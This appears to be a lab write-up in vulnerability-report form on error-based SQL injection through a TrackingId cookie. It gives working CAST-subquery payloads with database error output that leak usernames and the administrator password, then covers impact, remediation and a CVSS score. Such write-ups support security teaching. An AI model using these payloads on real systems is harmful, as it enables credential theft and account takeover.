# Title: Visible error-based SQL injection

## Description

The application is vulnerable to SQL Injection through the `TrackingId` cookie used for analytics tracking. User-supplied cookie values are incorporated directly into a backend SQL query without proper input sanitization or parameterized statements.

The application does not return query results directly; however, it exposes verbose database error messages. By crafting malicious SQL payloads that intentionally trigger type conversion errors, an attacker can force the database to include sensitive data within the error message.

Using this technique, an attacker can extract usernames and passwords from the database and gain unauthorized access to privileged accounts.

---

## Steps to Exploit

### 1. Identify the Injection Point

1. Navigate to the application's homepage.
2. Intercept the request using Burp Suite.
3. Locate the `TrackingId` cookie.
4. Append a single quote (`'`) to the cookie value.

```http
TrackingId=ogAZZfxtOKUELbuJ'
```

5. Forward the request.
6. Observe a verbose SQL error indicating an unclosed string literal.

This confirms that the cookie value is being incorporated directly into a SQL query.

---

### 2. Confirm SQL Injection

Terminate the original query and comment out the remaining syntax:

```sql
TrackingId=ogAZZfxtOKUELbuJ'--
```

Forward the request and verify that the error disappears, confirming successful query manipulation.

---

### 3. Verify Data Extraction Technique

Inject a subquery and cast its output to an integer:

```sql
TrackingId=ogAZZfxtOKUELbuJ' AND 1=CAST((SELECT 1) AS int)--
```

The application processes the query successfully, confirming that subqueries can be executed.

---

### 4. Extract Usernames

Attempt to retrieve usernames from the `users` table:

```sql
TrackingId=' AND 1=CAST((SELECT username FROM users LIMIT 1) AS int)--
```

The database generates an error similar to:

```text
ERROR: invalid input syntax for type integer: "administrator"
```

The error message leaks the first username stored in the table.

---

### 5. Extract Administrator Password

Modify the payload to retrieve the password instead:

```sql
TrackingId=' AND 1=CAST((SELECT password FROM users LIMIT 1) AS int)--
```

The database returns an error containing the administrator's password:

```text
ERROR: invalid input syntax for type integer: "<administrator_password>"
```

The password is disclosed directly within the application response.

---

### 6. Authenticate as Administrator

1. Navigate to the login page.
2. Use the leaked administrator credentials.
3. Successfully authenticate and gain administrative access.

---

## Proof of Concept

### Initial Injection Test

```sql
TrackingId=ogAZZfxtOKUELbuJ'
```

Response:

```text
Unclosed string literal
```

### Query Manipulation

```sql
TrackingId=ogAZZfxtOKUELbuJ'--
```

Response:

```text
No SQL syntax error returned
```

### Username Disclosure

```sql
TrackingId=' AND 1=CAST((SELECT username FROM users LIMIT 1) AS int)--
```

Response:

```text
ERROR: invalid input syntax for type integer: "administrator"
```

### Password Disclosure

```sql
TrackingId=' AND 1=CAST((SELECT password FROM users LIMIT 1) AS int)--
```

Response:

```text
ERROR: invalid input syntax for type integer: "<administrator_password>"
```

---

## Impact

* Unauthorized disclosure of sensitive database contents.
* Exposure of usernames and passwords.
* Complete compromise of administrator accounts.
* Privilege escalation and unauthorized access to restricted functionality.
* Potential lateral movement to other systems using reused credentials.
* Significant loss of confidentiality and trust in the application.

---

## Mitigation / Remediation

### 1. Use Parameterized Queries

Avoid concatenating user input into SQL statements.

**Secure Example**

```sql
SELECT * FROM tracking WHERE tracking_id = ?
```

### 2. Disable Verbose Error Messages

Configure production environments to suppress database errors from being returned to users.

### 3. Implement Input Validation

Validate and sanitize all user-controlled inputs, including cookies and HTTP headers.

### 4. Apply Least Privilege

Restrict database accounts to the minimum permissions required by the application.

### 5. Perform Security Testing

Conduct regular penetration testing, code reviews, and automated vulnerability scanning.

---

## CVSS Score

**CVSS v3.1 Score:** 9.8 (Critical)

**Vector:**

```text
CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:N
```

---

## CVSS Justification

| Metric              | Value     | Justification                                                       |
| ------------------- | --------- | ------------------------------------------------------------------- |
| Attack Vector       | Network   | Exploitable remotely through HTTP requests                          |
| Attack Complexity   | Low       | Simple payload injection with no special conditions                 |
| Privileges Required | None      | No authentication required                                          |
| User Interaction    | None      | No victim interaction required                                      |
| Scope               | Unchanged | Impact remains within the vulnerable application                    |
| Confidentiality     | High      | Disclosure of usernames and passwords                               |
| Integrity           | High      | Administrator account compromise enables unauthorized modifications |
| Availability        | None      | No service disruption observed                                      |

---

## Conclusion

The application is vulnerable to Error-Based SQL Injection through the analytics tracking cookie. Verbose database error messages allow attackers to extract sensitive information directly from backend queries. Successful exploitation results in administrator credential disclosure and complete compromise of privileged application functionality.
